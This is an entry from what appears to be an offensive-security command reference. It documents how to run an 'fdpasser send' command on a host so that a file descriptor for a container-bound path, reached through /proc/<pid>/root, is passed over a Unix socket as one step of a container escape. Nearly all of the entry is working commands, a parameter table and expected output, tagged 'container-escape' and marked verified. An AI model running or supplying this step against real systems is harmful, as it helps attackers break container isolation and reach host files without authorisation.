---
type: command
executor: bash
data: ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
platforms:
  - Linux
tags:
  - container-escape
  - fdpasser
verified: true
validated: true
---

# fdpasser-send-file-descriptor-from-host

## Command

```bash
./fdpasser send /proc/$(pgrep -f "$_PROCESS_NAME")/root/$_BIND_PATH
```

## Description

This command sends a file descriptor of a container-bound path (accessed via the host's /proc/<pid>/root) over a Unix socket to the container, completing the FD pass for escape. Use on the host after the container has prepared reception.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROCESS_NAME | Process pattern to find container PID (e.g., sleep 1337; or use direct PID) | Yes |
| $_BIND_PATH | Path bound in container (e.g., moo) | Yes |

## Examples

### Basic Usage

```bash
./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
```

### Advanced Usage (Direct PID)

```bash
./fdpasser send /proc/1234/root/tmp/host_access
```

## Expected Output

```
File descriptor sent successfully
```

Post-send, the container gains modified access to the host file, verifiable by permission changes.

## Related

- [[procedures/Container-Escape-Using-Device-File]]
- [[tools/fdpasser]]
